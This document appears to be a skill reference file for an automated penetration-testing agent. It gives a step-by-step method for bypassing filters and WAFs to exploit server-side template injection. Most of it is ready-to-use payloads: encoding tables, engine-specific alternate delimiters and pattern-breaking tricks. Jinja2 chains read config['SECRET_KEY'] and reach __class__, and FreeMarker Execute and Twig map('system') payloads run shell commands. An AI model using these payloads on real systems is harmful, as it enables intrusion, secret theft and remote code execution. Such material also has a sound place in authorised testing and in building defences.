# SSTI Filter Bypass Techniques

Systematic approach to bypassing filters. Follow the prioritization order:
1. **Encoding attempts** — Try all encodings for blocked characters
2. **Alternate syntax** — Use engine-specific alternative delimiters
3. **Pattern-breaking** — Newlines, null bytes, comments

**Return to:** [SKILL.md](./SKILL.md) Phase 2 (Confirmation) after successful bypass.

---

## Step 1: Identify Blocked Elements

Test characters individually with `SSTI{char}TEST`:

| Character | Purpose |
|-----------|---------|
| `{` `}` | Template delimiters |
| `$` | Variable prefix |
| `%` | Tag delimiters |
| `<` `>` | ERB/XML style |
| `_` | Python dunder access |
| `.` | Attribute access |
| `'` `"` | String delimiters |
| `[` `]` | Bracket notation |
| `(` `)` | Function calls |
| `#` | Comments/directives |

Record which characters are: **Blocked** / **Encoded** / **Allowed**

---

## Step 2: Encoding Attempts (Priority 1)

For each blocked character, try ALL encodings before moving to next technique:

### Encoding Matrix

| Encoding | `{` | `}` | `$` | `<` | `>` | `_` | `.` | `'` | `"` |
|----------|-----|-----|-----|-----|-----|-----|-----|-----|-----|
| URL | `%7b` | `%7d` | `%24` | `%3c` | `%3e` | `%5f` | `%2e` | `%27` | `%22` |
| Double URL | `%257b` | `%257d` | `%2524` | `%253c` | `%253e` | `%255f` | `%252e` | `%2527` | `%2522` |
| Unicode | `\u007b` | `\u007d` | `\u0024` | `\u003c` | `\u003e` | `\u005f` | `\u002e` | `\u0027` | `\u0022` |
| Hex (Python) | `\x7b` | `\x7d` | `\x24` | `\x3c` | `\x3e` | `\x5f` | `\x2e` | `\x27` | `\x22` |
| HTML Entity | `&#123;` | `&#125;` | `&#36;` | `&lt;` | `&gt;` | `&#95;` | `&#46;` | `&#39;` | `&#34;` |
| Octal | `\173` | `\175` | `\044` | `\074` | `\076` | `\137` | `\056` | `\047` | `\042` |

### Testing Approach

**Q:** How do I know which encoding works?
**A:** Send the encoded version. If the filter passes it AND the template engine decodes it, you'll see evaluation. If filter blocks, try next encoding.

Example for blocked `{`:
```
1. %7b%7b7*7%7d%7d → If 49, URL encoding works
2. %257b%257b7*7%257d%257d → If 49, double URL works
3. Continue through matrix...
```

**Q:** What if encoding passes filter but doesn't evaluate?
**A:** Filter may allow it but template engine receives literal encoded chars. Try mixing: encode only the blocked char, leave rest plain.

---

## Step 3: Alternate Syntax (Priority 2)

If encoding fails, try engine-specific alternate delimiters.

### Jinja2 Alternate Syntax

| Standard | Alternate | Notes |
|----------|-----------|-------|
| `{{ }}` | `{%- -%}` | Whitespace control variant |
| `{{ }}` | `{%+ +%}` | Whitespace preserve variant |
| `{{ x }}` | `{% print(x) %}` | Print statement |
| `{{ x }}` | `{# #}` | Comment (for detection only) |

**Q:** When to use `{% print() %}`?
**A:** If `{{}}` is blocked but `{%%}` is allowed. Same evaluation, different syntax.

Example:
```
{{7*7}} blocked → Try {% print(7*7) %}
```

### Twig Alternate Syntax

| Standard | Alternate | Notes |
|----------|-----------|-------|
| `{{ }}` | `{% %}` | Statement tags |
| `{{ x }}` | `{% set y=x %}{{y}}` | Indirect output |
| Comments | `{# #}` | May bypass some filters |

### FreeMarker Alternate Syntax

| Standard | Alternate | Notes |
|----------|-----------|-------|
| `${ }` | `#{ }` | Numeric interpolation |
| `${ }` | `[= ]` | Square bracket syntax |
| `<# >` | `[# ]` | Directive alternate |

Example:
```
${7*7} blocked → Try #{7*7} or [=7*7]
```

### Velocity Alternate Syntax

| Standard | Alternate | Notes |
|----------|-----------|-------|
| `$var` | `${var}` | Formal reference |
| `$var` | `$!var` | Quiet reference |
| `$var` | `$!{var}` | Quiet formal |

### Smarty Alternate Syntax

| Standard | Alternate | Notes |
|----------|-----------|-------|
| `{$x}` | `{ $x }` | Space inside delimiters |
| `{$x}` | Custom delimiters | Check if app changed them |

### ERB Alternate Syntax

| Standard | Alternate | Notes |
|----------|-----------|-------|
| `<%= %>` | `<%== %>` | Raw output |
| `<%= %>` | `<% print() %>` | Explicit print |
| `<% %>` | `<%- -%>` | Whitespace trim |

### Django Alternate Syntax

| Standard | Alternate | Notes |
|----------|-----------|-------|
| `{{ }}` | `{% %}` | Template tags |
| `{{x\|filter}}` | `{% filter %}` | Block filters |

---

## Step 4: Pattern-Breaking (Priority 3)

If encoding and alternate syntax fail, try breaking filter patterns.

### Newline Injection

Insert newline at start of payload:
```
%0a{{7*7}}
\n{{7*7}}
```

**Q:** Why does this work?
**A:** Some regex filters anchor to line start (`^`). Newline creates new "line" bypassing the pattern.

### Null Byte Injection

```
%00{{7*7}}
{{7*7}}%00
{{7%00*7}}
```

**Q:** When does null byte help?
**A:** Some filters terminate string processing at null. Template engine may ignore it.

### Comment Injection

Break up keywords with template comments:

**Jinja2:**
```
{{con{# #}fig}}
```

**Twig:**
```
{{_se{# comment #}lf}}
```

**FreeMarker:**
```
${.da<#-- -->ta_model}
```

### Whitespace Injection

```
{{ 7*7}}       → Leading space
{{7*7 }}       → Trailing space
{{  7 * 7  }}  → Multiple spaces
{{	7*7}}     → Tab character
```

### Case Variation

Generally doesn't work (template engines are case-sensitive), but try for filter bypass:
```
{{CONFIG}} vs {{config}}
```

---

## Step 5: Attribute Access Bypasses

For underscore (`_`) or dot (`.`) restrictions:

### Underscore Bypass

| Technique | Example |
|-----------|---------|
| Hex encoding | `{{''['\x5f\x5fclass\x5f\x5f']}}` |
| Request parameter | `{{''[request.args.a]}}` + `?a=__class__` |
| Unicode | `{{''['\u005f\u005fclass\u005f\u005f']}}` |
| Concat | `{{''['__cla'+'ss__']}}` |

### Dot Bypass

| Technique | Example |
|-----------|---------|
| Bracket notation | `{{config['SECRET_KEY']}}` instead of `{{config.SECRET_KEY}}` |
| `attr` filter | `{{request\|attr('application')}}` |
| `getattr` | `{{getattr(config,'items')()}}` |

### Quote Bypass

| Technique | Example |
|-----------|---------|
| Request args | `{{request.args.x}}` + `?x=value` |
| Chr function | `{{''[chr(95)+chr(95)+'class'+chr(95)+chr(95)]}}` |
| Format string | `{{'%c%c'%(95,95)}}` for `__` |

---

## Bypass Chains

### Jinja2: Progressive Bypass

**Level 1 - Dot blocked:**
```
{{config['SECRET_KEY']}}
```

**Level 2 - Dot + underscore blocked:**
```
{{config['\x5f\x5fclass\x5f\x5f']}}
```

**Level 3 - Dot + underscore + brackets blocked:**
```
{{config|attr('\x5f\x5fclass\x5f\x5f')}}
```

**Level 4 - Multiple chars blocked, use request params:**
```
{{request|attr(request.args.a)|attr(request.args.b)}}
?a=__class__&b=__init__
```

### FreeMarker: Keyword Bypass

If "Execute" keyword blocked:
```
<#assign ex=("freemarker.template.utility."+"Exe"+"cute")?new()>${ex("id")}
```

### Twig: Filter Bypass

If "system" blocked:
```
{{["id"]|map("sys"~"tem")|join}}
```

---

## Bypass Prioritization Protocol

```
1. Identify blocked character/pattern
2. Try ALL encodings for that character (URL → Double URL → Unicode → Hex → HTML → Octal)
3. If no encoding works → Try alternate syntax for suspected engine
4. If alternate syntax fails → Try pattern-breaking (newline → null → comments → whitespace)
5. If character-specific bypass needed → Use attribute access bypasses
6. Combine techniques if single technique insufficient
```

### Attempt Limits

- **Per encoding type:** 2 attempts (once plain, once combined)
- **Per alternate syntax:** 1 attempt
- **Per pattern-break technique:** 1 attempt
- **Total bypass attempts:** Max 10 before concluding heavily filtered

---

## Reasoning Format

```
[BYPASS]
[BLOCKED] {character or pattern}
[TECHNIQUE] {encoding / alternate syntax / pattern-break}
[ATTEMPT] {specific encoding or method}
[PAYLOAD] {full payload}
[RESULT] {success / still blocked / different error}
[ATTEMPTS] {X}/10
[NEXT] {try next encoding / move to alternate syntax / conclude filtered}
```

---

## Quick Reference: Common Scenarios

**Q:** Curly braces blocked, how to test Jinja2?
**A:** Try `{%print(7*7)%}` or URL encode `%7b%7b7*7%7d%7d`

**Q:** Underscores blocked, how to access `__class__`?
**A:** Use hex `\x5f\x5f` or request parameter injection

**Q:** All delimiters blocked but inside code context?
**A:** Test direct expression `7*7` without any delimiters

**Q:** WAF blocks common payloads?
**A:** Try newline prefix `%0a{{7*7}}` or break with comments `{{7{##}*7}}`

**Q:** Dollar sign blocked for FreeMarker?
**A:** Try `#{7*7}` or `[=7*7]` alternate syntax
